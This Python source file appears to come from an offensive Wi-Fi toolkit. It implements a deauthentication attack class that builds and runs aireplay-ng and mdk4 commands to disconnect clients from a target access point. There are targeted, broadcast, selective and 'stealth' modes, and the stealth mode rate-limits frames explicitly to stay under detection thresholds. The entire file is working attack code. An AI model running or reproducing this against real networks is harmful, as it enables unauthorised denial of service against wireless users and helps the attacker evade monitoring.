"""Deauthentication attack module.

Sends IEEE 802.11 deauthentication frames via aireplay-ng or mdk4 to
disconnect clients from a target access point.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field

from wafford.constants import DEFAULT_DEAUTH_COUNT
from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import ValidationError


@dataclass
class DeauthStats:
    """Per-run statistics for a deauthentication attack."""

    packets_sent: int = 0
    clients_targeted: set[str] = field(default_factory=set)
    clients_deauthed: set[str] = field(default_factory=set)
    broadcast_rounds: int = 0
    elapsed: float = 0.0

    @property
    def total_clients(self) -> int:
        return len(self.clients_targeted)

    @property
    def deauthed_count(self) -> int:
        return len(self.clients_deauthed)


class DeauthAttack(BaseAttack):
    """Send directed or broadcast deauthentication frames.

    Supports four modes:

    * **targeted** – deauth a single client from the AP.
    * **broadcast** – deauth *all* associated clients.
    * **selective** – deauth an explicit list of clients.
    * **stealth** – rate-limited deauth that stays under detection
      thresholds.

    All modes can use either ``aireplay-ng`` (preferred) or ``mdk4 d``
    as the frame source.
    """

    name = "deauth"

    def __init__(
        self,
        interface: str = "",
        *,
        use_mdk4: bool = False,
    ) -> None:
        super().__init__(interface)
        self.use_mdk4 = use_mdk4
        self.stats = DeauthStats()
        self._deauth_task: asyncio.Task[None] | None = None

    # ── Public API ────────────────────────────────────────────────────────

    async def targeted_deauth(
        self,
        bssid: str,
        client_mac: str,
        count: int = DEFAULT_DEAUTH_COUNT,
        interval: float = 0.5,
    ) -> AttackResult:
        """Send directed deauth frames to *client_mac* from *bssid*."""
        self._validate_mac(bssid, "bssid")
        self._validate_mac(client_mac, "client_mac")
        self.stats = DeauthStats(clients_targeted={client_mac})
        self._info(
            "Targeted deauth: client=%s ap=%s count=%d",
            client_mac,
            bssid,
            count,
        )
        self._emit("deauth.targeted", {"bssid": bssid, "client": client_mac, "count": count})

        if self.use_mdk4:
            argv = self._mdk4_deauth_argv(bssid, count, client_mac)
        else:
            argv = self._aireplay_argv(bssid, client_mac, count)

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")
        rc, stdout, stderr = await self._run_cmd(argv, timeout=count * interval + 30)
        self.stats.packets_sent = count * 2  # each --deauth sends deauth + disassoc
        self.stats.clients_deauthed.add(client_mac)
        self.stats.elapsed = self.status.elapsed

        if rc != 0 and rc != -1:
            self._warn("aireplay-ng exited %d: %s", rc, stderr[:200])

        return AttackResult(
            success=True,
            message=f"Sent {self.stats.packets_sent} deauth frames to {client_mac}",
            time_taken=self.stats.elapsed,
            extra={"stats": self.stats},
        )

    async def broadcast_deauth(
        self,
        bssid: str,
        count: int = DEFAULT_DEAUTH_COUNT,
        interval: float = 1.5,
    ) -> AttackResult:
        """Deauth *all* clients associated with *bssid* (broadcast)."""
        self._validate_mac(bssid, "bssid")
        self.stats = DeauthStats()
        self._info("Broadcast deauth: ap=%s count=%d", bssid, count)
        self._emit("deauth.broadcast", {"bssid": bssid, "count": count})

        if self.use_mdk4:
            argv = self._mdk4_deauth_argv(bssid, count, "FF:FF:FF:FF:FF:FF")
        else:
            argv = self._aireplay_argv(bssid, "FF:FF:FF:FF:FF:FF", count)

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        rounds_done = 0

        def _on_line(line: str) -> None:
            nonlocal rounds_done
            if " Sending" in line or "DeAuth" in line:
                rounds_done += 1
                self.stats.packets_sent += 2
                self.stats.broadcast_rounds = rounds_done

        rc = await self._run_cmd_streaming(
            argv, line_callback=_on_line, timeout=count * interval + 15
        )
        self.stats.elapsed = self.status.elapsed

        return AttackResult(
            success=rc == 0,
            message=f"Broadcast deauth completed — {self.stats.packets_sent} frames sent",
            time_taken=self.stats.elapsed,
            extra={"stats": self.stats},
        )

    async def selective_deauth(
        self,
        bssid: str,
        client_list: list[str],
        count: int = DEFAULT_DEAUTH_COUNT,
    ) -> AttackResult:
        """Deauth an explicit list of clients one at a time."""
        if not client_list:
            raise ValidationError("client_list must not be empty", field="client_list")
        for mac in client_list:
            self._validate_mac(mac, "client_mac")
        self._validate_mac(bssid, "bssid")
        self.stats = DeauthStats(clients_targeted=set(client_list))
        self._info(
            "Selective deauth: %d clients from ap=%s",
            len(client_list),
            bssid,
        )
        self._emit("deauth.selective", {"bssid": bssid, "clients": client_list})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        for mac in client_list:
            if self._cancel_event.is_set():
                break
            self._info("Deauthing client %s …", mac)
            if self.use_mdk4:
                argv = self._mdk4_deauth_argv(bssid, count, mac)
            else:
                argv = self._aireplay_argv(bssid, mac, count)
            rc, _, stderr = await self._run_cmd(argv, timeout=30)
            self.stats.packets_sent += count * 2
            if rc == 0:
                self.stats.clients_deauthed.add(mac)
            else:
                self._warn("Failed to deauth %s: %s", mac, stderr[:120])

        self.stats.elapsed = self.status.elapsed
        return AttackResult(
            success=self.stats.deauthed_count > 0,
            message=(
                f"Deauthed {self.stats.deauthed_count}/{self.stats.total_clients} clients"
            ),
            time_taken=self.stats.elapsed,
            extra={"stats": self.stats},
        )

    async def stealth_deauth(
        self,
        bssid: str,
        client_mac: str,
        interval: float = 5.0,
        max_packets: int = 20,
    ) -> AttackResult:
        """Rate-limited deauth that sends one frame per *interval* seconds."""
        self._validate_mac(bssid, "bssid")
        self._validate_mac(client_mac, "client_mac")
        self.stats = DeauthStats(clients_targeted={client_mac})
        self._info(
            "Stealth deauth: client=%s interval=%.1f max=%d",
            client_mac,
            interval,
            max_packets,
        )
        self._emit("deauth.stealth", {"bssid": bssid, "client": client_mac})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        sent = 0
        while sent < max_packets and not self._cancel_event.is_set():
            argv = self._aireplay_argv(bssid, client_mac, 1)
            rc, _, _ = await self._run_cmd(argv, timeout=10)
            sent += 1
            self.stats.packets_sent += 2
            self.status.packets_sent = self.stats.packets_sent
            self._emit("deauth.packet", {"sent": self.stats.packets_sent})
            if sent < max_packets and not self._cancel_event.is_set():
                try:
                    await asyncio.wait_for(self._cancel_event.wait(), timeout=interval)
                    break  # cancelled
                except TimeoutError:
                    pass  # normal — keep going

        self.stats.clients_deauthed.add(client_mac)
        self.stats.elapsed = self.status.elapsed
        return AttackResult(
            success=sent > 0,
            message=f"Stealth deauth sent {sent} frames to {client_mac}",
            time_taken=self.stats.elapsed,
            extra={"stats": self.stats},
        )

    # ── Validation ────────────────────────────────────────────────────────

    async def _pre_validate(self) -> None:
        await super()._pre_validate()
        self._require_tool("aireplay-ng")
        if self.use_mdk4:
            self._require_tool("mdk4")

    @staticmethod
    def _validate_mac(mac: str, field_name: str = "mac") -> None:
        parts = mac.split(":")
        if len(parts) != 6 or not all(0 <= int(p, 16) <= 255 for p in parts):
            raise ValidationError(f"Invalid MAC address: {mac}", field=field_name)

    # ── Command builders ──────────────────────────────────────────────────

    def _aireplay_argv(
        self,
        bssid: str,
        client: str,
        count: int,
        interface: str = "",
    ) -> list[str]:
        iface = interface or self.interface
        return [
            "aireplay-ng",
            "--deauth",
            str(count),
            "-a",
            bssid,
            "-c",
            client,
            "--ignore-negative-one",
            iface,
        ]

    def _mdk4_deauth_argv(
        self,
        bssid: str,
        count: int,
        client: str = "FF:FF:FF:FF:FF:FF",
        interface: str = "",
    ) -> list[str]:
        iface = interface or self.interface
        return ["mdk4", iface, "d", "-B", bssid, "-c", client, "-n", str(count)]

    async def _cleanup(self) -> None:
        if self._deauth_task and not self._deauth_task.done():
            self._deauth_task.cancel()
        await super()._cleanup()
        self._info("Deauth cleanup complete")
